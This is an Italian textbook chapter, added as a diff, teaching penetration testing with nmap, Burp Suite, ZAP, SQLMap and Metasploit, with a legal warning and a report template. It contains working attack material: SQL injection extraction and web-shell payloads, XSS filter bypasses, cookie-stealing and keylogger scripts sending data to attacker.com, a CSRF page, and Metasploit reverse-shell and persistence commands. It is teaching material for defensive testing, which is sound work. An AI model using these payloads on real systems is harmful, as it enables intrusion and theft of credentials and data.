@@ -1,0 +1,976 @@
+\chapter{Penetration Testing e Vulnerability Assessment}
+
+\begin{tcolorbox}[title=Mappa del capitolo]
+Obiettivi, Metodologie, Reconnaissance, Scanning, Exploitation, Post-exploitation, Tools (Burp Suite, OWASP ZAP, nmap, Metasploit), Reporting, Remediation, Legal aspects, Compliance.
+\end{tcolorbox}
+
+\section*{Introduzione}
+Il Penetration Testing (pentesting) è il processo di testare la sicurezza di un'applicazione simulando un attacco reale. Un pentest ben condotto identifica vulnerabilità prima che vengano sfruttate da attaccanti malintenzionati. Questo capitolo copre metodologie, tools e best practices per condurre penetration test professionali.
+
+\section{Obiettivi di apprendimento}
+\begin{itemize}
+    \item Comprendere metodologie di penetration testing (OWASP, OSSTMM, PTES)
+    \item Eseguire reconnaissance e information gathering
+    \item Condurre vulnerability scanning
+    \item Utilizzare Burp Suite per web app testing
+    \item Utilizzare OWASP ZAP per automated scanning
+    \item Eseguire network scanning con nmap
+    \item Sfruttare vulnerabilità comuni (SQLi, XSS, CSRF)
+    \item Documentare findings in report professionale
+    \item Comprendere aspetti legali del pentesting
+\end{itemize}
+
+\section{Metodologie di Penetration Testing}
+
+\subsection{OWASP Testing Guide}
+
+\begin{tcolorbox}[colback=blue!10, colframe=blue!60, title=OWASP Web Security Testing Guide v4.2]
+\textbf{Fasi principali}:
+\begin{enumerate}
+    \item \textbf{Information Gathering}: Raccolta informazioni target
+    \item \textbf{Configuration Management Testing}: Test configurazione
+    \item \textbf{Identity Management Testing}: Test autenticazione
+    \item \textbf{Authentication Testing}: Test meccanismi auth
+    \item \textbf{Authorization Testing}: Test controlli accesso
+    \item \textbf{Session Management Testing}: Test gestione sessioni
+    \item \textbf{Input Validation Testing}: Test validazione input
+    \item \textbf{Error Handling}: Test gestione errori
+    \item \textbf{Cryptography}: Test implementazione crypto
+    \item \textbf{Business Logic Testing}: Test logica business
+    \item \textbf{Client-Side Testing}: Test lato client
+\end{enumerate}
+\end{tcolorbox}
+
+\subsection{Penetration Testing Execution Standard (PTES)}
+
+\begin{lstlisting}[language=text, caption={Fasi PTES}]
+1. Pre-engagement Interactions
+   - Definizione scope
+   - Autorizzazioni legali
+   - Rules of engagement
+
+2. Intelligence Gathering (Reconnaissance)
+   - OSINT (Open Source Intelligence)
+   - Footprinting
+   - Fingerprinting
+
+3. Threat Modeling
+   - Business asset analysis
+   - Threat capability modeling
+   - Threat modeling
+
+4. Vulnerability Analysis
+   - Vulnerability testing
+   - Vulnerability validation
+
+5. Exploitation
+   - Precision strike
+   - Tailored exploitation
+   - Proof of concept
+
+6. Post Exploitation
+   - Infrastructure analysis
+   - Pillaging
+   - Persistence
+
+7. Reporting
+   - Executive summary
+   - Technical report
+   - Remediation recommendations
+\end{lstlisting}
+
+\section{Reconnaissance}
+
+\subsection{Passive Reconnaissance}
+
+Raccolta informazioni senza interagire direttamente con il target.
+
+\begin{lstlisting}[language=bash, caption={Passive reconnaissance tools}]
+# 1. WHOIS - Informazioni dominio
+whois example.com
+
+# Output:
+# - Registrar
+# - Registration date
+# - Expiration date
+# - Name servers
+# - Admin contact
+
+# 2. DNS Enumeration
+dig example.com ANY
+dig @8.8.8.8 example.com MX
+dig @8.8.8.8 example.com TXT
+
+# Subdomain enumeration (passive)
+# Usa Certificate Transparency logs
+curl -s "https://crt.sh/?q=%.example.com&output=json" | \
+  jq -r '.[].name_value' | \
+  sort -u
+
+# 3. Google Dorking
+# Cerca file sensibili indicizzati
+# site:example.com filetype:pdf
+# site:example.com inurl:admin
+# site:example.com ext:sql | ext:bak
+# site:example.com "index of" password
+
+# 4. Shodan - Search engine per dispositivi IoT
+# https://www.shodan.io
+# Cerca: "org:Example Corp" "apache"
+
+# 5. theHarvester - Email e subdomain enumeration
+theHarvester -d example.com -b google,bing,linkedin
+
+# 6. Wayback Machine - Versioni storiche sito
+# https://web.archive.org
+# Può rivelare:
+# - Vecchie pagine con vulnerabilità
+# - File dimenticati
+# - Commenti nel codice
+# - Struttura directory
+
+# 7. GitHub/GitLab reconnaissance
+# Cerca repository dell'organizzazione
+# Cerca secrets accidentalmente committati
+# - API keys
+# - Passwords
+# - Database credentials
+
+# Tool: truffleHog
+trufflehog --regex --entropy=False https://github.com/example/repo
+
+# 8. Job postings analysis
+# Cerca job listings per capire tech stack
+# LinkedIn, Indeed, Glassdoor
+# Rivela:
+# - Programming languages
+# - Frameworks
+# - Databases
+# - Cloud providers
+\end{lstlisting}
+
+\subsection{Active Reconnaissance}
+
+Interazione diretta con il target.
+
+\begin{lstlisting}[language=bash, caption={Active reconnaissance con nmap}]
+# 1. Host discovery
+nmap -sn 192.168.1.0/24
+# Ping scan - scopri host attivi
+
+# 2. Port scanning
+# TCP SYN scan (stealth)
+nmap -sS -p- example.com
+# Scansiona tutte le 65535 porte
+
+# Top 1000 porte (veloce)
+nmap -F example.com
+
+# Porte specifiche
+nmap -p 80,443,8080,8443 example.com
+
+# 3. Service/Version detection
+nmap -sV -p 80,443 example.com
+# Output:
+# 80/tcp  open  http     Apache httpd 2.4.41
+# 443/tcp open  ssl/http nginx 1.18.0
+
+# 4. OS detection
+sudo nmap -O example.com
+
+# 5. Script scanning (NSE - Nmap Scripting Engine)
+nmap -sC example.com
+# Esegue default scripts
+
+# Script specifici
+nmap --script ssl-enum-ciphers -p 443 example.com
+nmap --script http-methods -p 80 example.com
+nmap --script http-headers -p 80 example.com
+
+# 6. Comprehensive scan
+nmap -sS -sV -O -A -p- -T4 --script vuln example.com
+# -A: Aggressive (OS, version, scripts, traceroute)
+# --script vuln: Vulnerability detection scripts
+# -T4: Timing template (faster)
+
+# 7. Output formats
+nmap -oN scan.txt example.com     # Normal output
+nmap -oX scan.xml example.com     # XML output
+nmap -oG scan.gnmap example.com   # Grepable output
+nmap -oA scan example.com         # All formats
+
+# 8. Firewall/IDS evasion
+nmap -f example.com               # Fragment packets
+nmap -D RND:10 example.com        # Decoy scan
+nmap --spoof-mac 0 example.com    # Spoof MAC address
+nmap --data-length 200 example.com # Random data padding
+\end{lstlisting}
+
+\subsection{Web Application Fingerprinting}
+
+\begin{lstlisting}[language=bash, caption={Web tech fingerprinting}]
+# 1. whatweb - Web technology detector
+whatweb example.com
+
+# Output:
+# HTTP Server: nginx/1.18.0
+# Country: US
+# IP: 93.184.216.34
+# WordPress: 5.8
+# PHP: 7.4.3
+
+# 2. wappalyzer (browser extension o CLI)
+# Identifica:
+# - CMS (WordPress, Drupal, Joomla)
+# - JavaScript frameworks (React, Vue, Angular)
+# - Web servers
+# - CDN
+# - Analytics tools
+
+# 3. Manual fingerprinting
+curl -I https://example.com
+# Analizza headers:
+# - Server
+# - X-Powered-By
+# - X-AspNet-Version
+# - Set-Cookie (framework-specific)
+
+# 4. Detect CMS
+# WordPress:
+# - /wp-admin/
+# - /wp-content/
+# - /wp-includes/
+
+# Drupal:
+# - /sites/default/
+# - /core/
+# - CHANGELOG.txt
+
+# Joomla:
+# - /administrator/
+# - /components/
+# - /language/
+
+# 5. nikto - Web server scanner
+nikto -h https://example.com
+
+# Verifica:
+# - Server misconfiguration
+# - Outdated software
+# - Dangerous files
+# - Default files/dirs
+\end{lstlisting}
+
+\section{Burp Suite}
+
+Burp Suite è lo strumento più usato per web application pentesting.
+
+\subsection{Setup e configurazione}
+
+\begin{lstlisting}[language=text, caption={Burp Suite setup}]
+1. Download Burp Suite Community Edition
+   https://portswigger.net/burp/communitydownload
+
+2. Configura browser proxy
+   Firefox/Chrome → Settings → Proxy
+   HTTP Proxy: 127.0.0.1
+   Port: 8080
+
+3. Installa Burp CA certificate
+   - Browser → http://burp
+   - Download CA certificate
+   - Import in browser trusted certificates
+
+4. Burp Suite tabs:
+   - Proxy: Intercept/modify HTTP requests
+   - Target: Site map, scope definition
+   - Intruder: Automated attacks (fuzzing, brute force)
+   - Repeater: Manual request editing
+   - Sequencer: Token randomness analysis
+   - Decoder: Encode/decode data
+   - Comparer: Compare responses
+\end{lstlisting}
+
+\subsection{Testing con Burp Suite}
+
+\begin{lstlisting}[language=text, caption={Burp Suite workflow}]
+# 1. Passive Spidering
+Target → Site map → Right click → Passively scan this host
+
+# 2. Active Scanning (Pro only)
+# Community edition richiede manual testing
+
+# 3. Intercept e Modify requests
+Proxy → Intercept On
+- Modifica parametri
+- Test injection
+- Bypass client-side validation
+
+# 4. Repeater - Manual testing
+- Invia request a Repeater (Ctrl+R)
+- Modifica request
+- Analizza response
+- Test SQLi, XSS, IDOR, etc.
+
+Esempio SQLi test:
+GET /api/user?id=1' OR '1'='1 HTTP/1.1
+
+Esempio XSS test:
+POST /comment HTTP/1.1
+comment=<script>alert(document.cookie)</script>
+
+# 5. Intruder - Automated fuzzing
+Positions → Seleziona parametri da fuzzare
+Payloads → Carica wordlist
+Attack → Inizia attack
+
+Esempio: Username enumeration
+POST /login
+username=§test§&password=wrong
+
+Payload:
+admin
+administrator
+root
+user
+...
+
+Analizza response:
+- Length diversa → username valido
+- Time diverso → username valido
+- Error message diverso → username valido
+
+# 6. Sequencer - Session token analysis
+- Cattura 20000+ session tokens
+- Analizza entropia
+- Verifica predicibilità
+
+Se token predicibili → session hijacking risk!
+
+# 7. Scanner (Pro)
+- Passive scanning (automatic)
+- Active scanning (richiede conferma)
+- Identifica:
+  - SQLi
+  - XSS
+  - CSRF
+  - XXE
+  - SSRF
+  - Insecure deserialization
+  - Path traversal
+\end{lstlisting}
+
+\subsection{Burp Extensions}
+
+\begin{lstlisting}[language=text, caption={Burp Suite extensions utili}]
+Extender → BApp Store:
+
+1. Autorize - Authorization testing
+   - Test horizontal/vertical privilege escalation
+   - Automatic testing
+
+2. JSON Web Tokens - JWT manipulation
+   - Decode JWT
+   - Modify claims
+   - Test signature validation
+
+3. Param Miner - Parameter discovery
+   - Trova parametri hidden
+   - Cache poisoning
+
+4. Retire.js - JavaScript library vulnerabilities
+   - Identifica librerie JS vulnerabili
+
+5. Active Scan++ - Additional scan checks
+   - Cacheable HTTPS
+   - Host header attack
+   - Edge Side Includes
+
+6. Collaborator Everywhere - SSRF/XXE detection
+   - Out-of-band detection
+
+7. Logger++ - Advanced logging
+   - Log tutte le requests
+   - Grep/filter logs
+\end{lstlisting}
+
+\section{OWASP ZAP (Zed Attack Proxy)}
+
+ZAP è alternativa open source a Burp Suite.
+
+\begin{lstlisting}[language=bash, caption={OWASP ZAP automated scanning}]
+# 1. Download e install
+# https://www.zaproxy.org/download/
+
+# 2. GUI mode
+zap.sh
+
+# 3. Automated scan (headless)
+zap.sh -cmd -quickurl https://example.com -quickprogress
+
+# 4. Full scan con API
+docker run -t owasp/zap2docker-stable zap-full-scan.py \
+  -t https://example.com \
+  -r report.html
+
+# 5. Baseline scan (passive only)
+docker run -t owasp/zap2docker-stable zap-baseline.py \
+  -t https://example.com
+
+# 6. API scan
+docker run -t owasp/zap2docker-stable zap-api-scan.py \
+  -t https://example.com/openapi.json \
+  -f openapi
+
+# 7. ZAP Scripting (automation)
+# Python API client
+from zapv2 import ZAPv2
+
+zap = ZAPv2(proxies={'http': 'http://127.0.0.1:8080',
+                     'https': 'http://127.0.0.1:8080'})
+
+# Spider
+print('Spidering target...')
+zap.spider.scan('https://example.com')
+
+# Active scan
+print('Scanning target...')
+zap.ascan.scan('https://example.com')
+
+# Get alerts
+alerts = zap.core.alerts()
+for alert in alerts:
+    print(f"{alert['risk']}: {alert['alert']} - {alert['url']}")
+
+# Generate report
+html_report = zap.core.htmlreport()
+with open('report.html', 'w') as f:
+    f.write(html_report)
+
+# 8. CI/CD Integration
+# .gitlab-ci.yml
+zap_scan:
+  image: owasp/zap2docker-stable
+  script:
+    - mkdir /zap/wrk
+    - zap-baseline.py -t $TARGET_URL -r report.html
+  artifacts:
+    paths:
+      - report.html
+    when: always
+  allow_failure: true
+\end{lstlisting}
+
+\section{SQLMap}
+
+SQLMap è tool automatizzato per SQL injection testing.
+
+\begin{lstlisting}[language=bash, caption={SQLMap usage}]
+# 1. Basic usage
+sqlmap -u "http://example.com/product.php?id=1"
+
+# 2. POST requests
+sqlmap -u "http://example.com/login.php" \
+  --data="username=admin&password=test"
+
+# 3. Cookie-based
+sqlmap -u "http://example.com/profile.php" \
+  --cookie="PHPSESSID=abc123"
+
+# 4. Enumerate databases
+sqlmap -u "http://example.com/product.php?id=1" --dbs
+
+# Output:
+# available databases [3]:
+# [*] information_schema
+# [*] mysql
+# [*] webapp_db
+
+# 5. Enumerate tables
+sqlmap -u "http://example.com/product.php?id=1" \
+  -D webapp_db --tables
+
+# 6. Enumerate columns
+sqlmap -u "http://example.com/product.php?id=1" \
+  -D webapp_db -T users --columns
+
+# 7. Dump data
+sqlmap -u "http://example.com/product.php?id=1" \
+  -D webapp_db -T users --dump
+
+# 8. Dump specific columns
+sqlmap -u "http://example.com/product.php?id=1" \
+  -D webapp_db -T users -C username,password --dump
+
+# 9. OS command execution (se db user ha privilegi)
+sqlmap -u "http://example.com/product.php?id=1" --os-shell
+
+# 10. Advanced options
+sqlmap -u "http://example.com/product.php?id=1" \
+  --level=5 \      # Test thoroughness (1-5)
+  --risk=3 \       # Risk level (1-3)
+  --threads=10 \   # Parallel requests
+  --batch \        # Never ask for user input
+  --random-agent   # Random User-Agent
+
+# 11. Tamper scripts (WAF bypass)
+sqlmap -u "http://example.com/product.php?id=1" \
+  --tamper=space2comment,between
+
+# Tamper scripts disponibili:
+# - space2comment: space → /**/
+# - charencode: Encode characters
+# - between: AND → AND BETWEEN
+# - randomcase: Random case
+\end{lstlisting}
+
+\section{XSStrike}
+
+Tool per advanced XSS detection.
+
+\begin{lstlisting}[language=bash, caption={XSStrike usage}]
+# Install
+git clone https://github.com/s0md3v/XSStrike.git
+cd XSStrike
+pip install -r requirements.txt
+
+# Basic scan
+python xsstrike.py -u "http://example.com/search.php?q=test"
+
+# POST request
+python xsstrike.py -u "http://example.com/comment" \
+  --data "comment=test&name=user"
+
+# Crawl mode
+python xsstrike.py -u "http://example.com" --crawl
+
+# Skip DOM XSS check (faster)
+python xsstrike.py -u "http://example.com/search.php?q=test" --skip-dom
+
+# XSStrike features:
+# - Context-aware payload generation
+# - WAF detection and bypass
+# - DOM XSS scanning
+# - Fuzzing
+# - Crawling
+
+# Payloads XSS comuni:
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg/onload=alert(1)>
+<iframe src="javascript:alert(1)">
+'"><script>alert(1)</script>
+javascript:alert(1)
+<input autofocus onfocus=alert(1)>
+<marquee onstart=alert(1)>
+\end{lstlisting}
+
+\section{Metasploit Framework}
+
+Metasploit è framework per exploitation.
+
+\begin{lstlisting}[language=bash, caption={Metasploit basics}]
+# Start Metasploit console
+msfconsole
+
+# Search for exploits
+msf6 > search wordpress
+
+# Use exploit
+msf6 > use exploit/unix/webapp/wp_admin_shell_upload
+
+# Show options
+msf6 exploit(wp_admin_shell_upload) > show options
+
+# Set parameters
+msf6 exploit(wp_admin_shell_upload) > set RHOSTS 192.168.1.100
+msf6 exploit(wp_admin_shell_upload) > set TARGETURI /wordpress/
+msf6 exploit(wp_admin_shell_upload) > set USERNAME admin
+msf6 exploit(wp_admin_shell_upload) > set PASSWORD password123
+
+# Set payload
+msf6 exploit(wp_admin_shell_upload) > set PAYLOAD php/meterpreter/reverse_tcp
+msf6 exploit(wp_admin_shell_upload) > set LHOST 192.168.1.50
+
+# Run exploit
+msf6 exploit(wp_admin_shell_upload) > exploit
+
+# Meterpreter shell commands
+meterpreter > sysinfo          # System info
+meterpreter > getuid           # Current user
+meterpreter > pwd              # Current directory
+meterpreter > ls               # List files
+meterpreter > cat /etc/passwd  # Read file
+meterpreter > download /etc/passwd # Download file
+meterpreter > upload backdoor.php  # Upload file
+meterpreter > shell            # Get system shell
+
+# Post-exploitation modules
+meterpreter > run post/linux/gather/checkvm  # Check if VM
+meterpreter > run post/linux/gather/enum_configs  # Enumerate configs
+meterpreter > run post/linux/gather/hashdump  # Dump password hashes
+
+# Persistence
+meterpreter > run persistence -X -i 60 -p 4444 -r 192.168.1.50
+\end{lstlisting}
+
+\section{Common Vulnerabilities Testing}
+
+\subsection{SQL Injection Testing}
+
+\begin{lstlisting}[language=text, caption={Manual SQLi testing}]
+# 1. Detection
+# Payload: '
+URL: http://example.com/product?id=1'
+
+Error: "You have an error in your SQL syntax"
+→ SQL injection vulnerability!
+
+# 2. Determine number of columns (UNION-based)
+id=1 ORDER BY 1--     # No error
+id=1 ORDER BY 2--     # No error
+id=1 ORDER BY 3--     # Error
+→ 2 columns
+
+# 3. Find injectable columns
+id=-1 UNION SELECT 1,2--
+→ Shows which columns are displayed
+
+# 4. Extract database info
+id=-1 UNION SELECT database(),version()--
+→ Current database, MySQL version
+
+# 5. Extract table names
+id=-1 UNION SELECT 1,table_name FROM information_schema.tables WHERE table_schema=database()--
+
+# 6. Extract column names
+id=-1 UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='users'--
+
+# 7. Extract data
+id=-1 UNION SELECT username,password FROM users--
+
+# 8. Write file (if FILE privilege)
+id=1 UNION SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php'--
+
+# 9. Boolean-based blind SQLi
+id=1 AND 1=1--  # True → normal page
+id=1 AND 1=2--  # False → different page/error
+
+# Extract data char by char:
+id=1 AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--
+
+# 10. Time-based blind SQLi
+id=1 AND SLEEP(5)--
+→ If page loads in 5 seconds → vulnerable
+
+# Extract data:
+id=1 AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a',SLEEP(5),0)--
+\end{lstlisting}
+
+\subsection{XSS Testing}
+
+\begin{lstlisting}[language=html, caption={XSS payloads}]
+<!-- 1. Reflected XSS detection -->
+URL: http://example.com/search?q=<script>alert(1)</script>
+
+<!-- 2. Stored XSS -->
+Comment: <script>alert(document.cookie)</script>
+
+<!-- 3. DOM XSS -->
+URL: http://example.com/#<img src=x onerror=alert(1)>
+
+<!-- 4. Bypass filters -->
+<!-- If <script> filtered -->
+<img src=x onerror=alert(1)>
+<svg/onload=alert(1)>
+<iframe src="javascript:alert(1)">
+
+<!-- If () filtered -->
+<script>alert`1`</script>
+
+<!-- If quotes filtered -->
+<script>alert(String.fromCharCode(88,83,83))</script>
+
+<!-- Encoding -->
+URL encode: %3Cscript%3Ealert(1)%3C/script%3E
+HTML encode: &lt;script&gt;alert(1)&lt;/script&gt;
+Unicode: \u003cscript\u003ealert(1)\u003c/script\u003e
+
+<!-- 5. Cookie stealing -->
+<script>
+  fetch('http://attacker.com/steal?cookie=' + document.cookie);
+</script>
+
+<!-- 6. Keylogger -->
+<script>
+  document.onkeypress = function(e) {
+    fetch('http://attacker.com/log?key=' + e.key);
+  }
+</script>
+
+<!-- 7. Phishing -->
+<script>
+  document.body.innerHTML = '<h1>Session Expired</h1><form action="http://attacker.com/phish"><input name="password" type="password"><button>Login</button></form>';
+</script>
+\end{lstlisting}
+
+\subsection{CSRF Testing}
+
+\begin{lstlisting}[language=html, caption={CSRF PoC}]
+<!-- Scenario: Change password senza CSRF token -->
+
+<!-- Legitimate request -->
+POST /change-password HTTP/1.1
+Host: example.com
+Cookie: session=abc123
+
+new_password=MyNewPass123
+
+<!-- CSRF Attack -->
+<!-- Attacker's malicious page -->
+<html>
+<body>
+  <h1>You Won a Prize!</h1>
+  <!-- Hidden form -->
+  <form id="csrf" action="https://example.com/change-password" method="POST">
+    <input type="hidden" name="new_password" value="hacked123">
+  </form>
+  <script>
+    // Auto-submit
+    document.getElementById('csrf').submit();
+  </script>
+</body>
+</html>
+
+<!-- Quando vittima visita pagina attacker → password cambiata! -->
+
+<!-- Testing checklist -->
+1. Rimuovi CSRF token dalla request → se funziona = VULNERABLE
+2. Usa CSRF token di altra sessione → se funziona = VULNERABLE
+3. Cambia POST in GET → se funziona = VULNERABLE
+4. Modifica Content-Type → se funziona = bypass possibile
+\end{lstlisting}
+
+\section{Reporting}
+
+\subsection{Struttura report professionale}
+
+\begin{lstlisting}[language=text, caption={Template penetration testing report}]
+PENETRATION TESTING REPORT
+==========================
+
+1. EXECUTIVE SUMMARY
+   1.1 Scope
+   1.2 Objectives
+   1.3 Timeline
+   1.4 Overall Risk Rating
+   1.5 Key Findings Summary
+   1.6 Remediation Priority
+
+2. METHODOLOGY
+   2.1 Testing Approach (OWASP/PTES)
+   2.2 Tools Used
+   2.3 Testing Phases
+   2.4 Limitations and Constraints
+
+3. TECHNICAL FINDINGS
+
+   For each vulnerability:
+
+   VULNERABILITY: SQL Injection in Product Search
+
+   Severity: CRITICAL
+   CVSS Score: 9.8
+   CWE: CWE-89
+
+   Description:
+   The product search functionality is vulnerable to SQL injection
+   attacks due to improper input validation. An attacker can inject
+   malicious SQL code to extract sensitive data from the database.
+
+   Location:
+   - URL: https://example.com/search
+   - Parameter: q
+   - Method: GET
+
+   Impact:
+   - Unauthorized data access
+   - Database compromise
+   - Potential server takeover
+   - Data breach (customer PII, credit cards)
+
+   Steps to Reproduce:
+   1. Navigate to https://example.com/search
+   2. Enter payload: ' OR '1'='1
+   3. Submit search
+   4. Observe SQL error message revealing database structure
+
+   Proof of Concept:
+   Request:
+   GET /search?q=' UNION SELECT username,password FROM users-- HTTP/1.1
+
+   Response:
+   [Shows database dump with usernames and password hashes]
+
+   Evidence:
+   [Screenshots, request/response logs]
+
+   Remediation:
+   1. Use parameterized queries/prepared statements
+   2. Implement input validation and sanitization
+   3. Apply principle of least privilege for database user
+   4. Enable WAF with SQL injection rules
+   5. Regular security testing
+
+   Code Example (BEFORE - Vulnerable):
+   $query = "SELECT * FROM products WHERE name LIKE '%" . $_GET['q'] . "%'";
+
+   Code Example (AFTER - Secure):
+   $stmt = $pdo->prepare("SELECT * FROM products WHERE name LIKE ?");
+   $stmt->execute(["%{$_GET['q']}%"]);
+
+   References:
+   - OWASP SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection
+   - CWE-89: https://cwe.mitre.org/data/definitions/89.html
+
+4. RISK ASSESSMENT
+   4.1 Critical: X findings
+   4.2 High: Y findings
+   4.3 Medium: Z findings
+   4.4 Low: W findings
+   4.5 Informational: V findings
+
+5. REMEDIATION ROADMAP
+   - Priority 1 (Immediate - 1 week)
+   - Priority 2 (High - 1 month)
+   - Priority 3 (Medium - 3 months)
+   - Priority 4 (Low - 6 months)
+
+6. CONCLUSION
+
+7. APPENDICES
+   A. Vulnerability Details
+   B. Tool Output
+   C. Compliance Mapping (PCI-DSS, GDPR, etc.)
+\end{lstlisting}
+
+\subsection{Severity Rating}
+
+\begin{tcolorbox}[colback=yellow!10, colframe=yellow!60, title=CVSS v3.1 Scoring]
+\textbf{Common Vulnerability Scoring System}
+
+Base Score calculation:
+\begin{itemize}
+    \item \textbf{Attack Vector (AV)}: Network, Adjacent, Local, Physical
+    \item \textbf{Attack Complexity (AC)}: Low, High
+    \item \textbf{Privileges Required (PR)}: None, Low, High
+    \item \textbf{User Interaction (UI)}: None, Required
+    \item \textbf{Scope (S)}: Unchanged, Changed
+    \item \textbf{Confidentiality (C)}: None, Low, High
+    \item \textbf{Integrity (I)}: None, Low, High
+    \item \textbf{Availability (A)}: None, Low, High
+\end{itemize}
+
+Severity Ratings:
+\begin{itemize}
+    \item 0.0: None
+    \item 0.1-3.9: Low
+    \item 4.0-6.9: Medium
+    \item 7.0-8.9: High
+    \item 9.0-10.0: Critical
+\end{itemize}
+
+Calculator: \url{https://www.first.org/cvss/calculator/3.1}
+\end{tcolorbox}
+
+\section{Legal Aspects}
+
+\begin{tcolorbox}[colback=red!10, colframe=red!60, title=IMPORTANTE: Aspetti Legali]
+\textbf{MAI fare pentesting senza autorizzazione scritta!}
+
+Requisiti legali:
+\begin{enumerate}
+    \item \textbf{Contratto firmato}: Scope, timeline, metodologia
+    \item \textbf{Letter of Authorization}: Documento che autorizza testing
+    \item \textbf{Rules of Engagement}: Limiti, orari, contatti emergenza
+    \item \textbf{NDA}: Non-disclosure agreement per proteggere informazioni
+    \item \textbf{Liability}: Limitazione responsabilità
+\end{enumerate}
+
+Reati potenziali (senza autorizzazione):
+\begin{itemize}
+    \item Accesso abusivo a sistema informatico
+    \item Frode informatica
+    \item Danneggiamento di dati/programmi
+    \item Intercettazione comunicazioni
+    \item Detenzione abusiva di codici di accesso
+\end{itemize}
+
+Pene: Fino a 3 anni reclusione (Italia, Art. 615-ter C.P.)
+\end{tcolorbox}
+
+\section{Compliance}
+
+\subsection{PCI-DSS Requirements}
+
+\begin{tcolorbox}[colback=blue!10, colframe=blue!60, title=PCI-DSS Penetration Testing]
+\textbf{Requirement 11.3}: Perform penetration testing
+
+11.3.1: Perform external penetration testing at least annually
+
+11.3.2: Perform internal penetration testing at least annually
+
+11.3.3: Exploitable vulnerabilities found must be corrected and testing repeated
+
+11.3.4: If segmentation used, perform testing to verify isolation
+
+Scope:
+\begin{itemize}
+    \item Cardholder Data Environment (CDE)
+    \item Critical systems
+    \item Network segmentation controls
+\end{itemize}
+
+Methodology:
+\begin{itemize}
+    \item Industry-accepted approach (OWASP, PTES)
+    \item Coverage of CDE perimeter and critical systems
+    \item Test from both inside and outside
+    \item Test application layer and network layer
+\end{itemize}
+\end{tcolorbox}
+
+\section{Esercizi}
+
+\begin{enumerate}
+    \item Setup lab environment con DVWA (Damn Vulnerable Web Application)
+    \item Esegui reconnaissance completo su target test
+    \item Usa Burp Suite per trovare 5 diverse vulnerabilità in DVWA
+    \item Scrivi exploit Python per SQLi found
+    \item Configura ZAP per automated scanning in CI/CD
+    \item Scrivi report professionale per findings trovati
+    \item Pratica con CTF challenges (HackTheBox, TryHackMe)
+\end{enumerate}
+
+\section{Verifica}
+
+\begin{itemize}
+    \item Quali sono le fasi del PTES?
+    \item Qual è la differenza tra passive e active reconnaissance?
+    \item Come usi Burp Repeater per testare SQLi?
+    \item Cos'è CVSS e come si calcola?
+    \item Quali informazioni deve contenere un report professionale?
+    \item Perché è critico avere autorizzazione scritta prima di pentesting?
+\end{itemize}
+
+\section{Riferimenti}
+
+\begin{itemize}
+    \item OWASP Testing Guide: \url{https://owasp.org/www-project-web-security-testing-guide/}
+    \item PTES: \url{http://www.pentest-standard.org/}
+    \item Burp Suite Documentation: \url{https://portswigger.net/burp/documentation}
+    \item OWASP ZAP: \url{https://www.zaproxy.org/docs/}
+    \item DVWA: \url{https://github.com/digininja/DVWA}
+    \item HackTheBox: \url{https://www.hackthebox.eu/}
+    \item CVSS Calculator: \url{https://www.first.org/cvss/calculator/3.1}
+\end{itemize}
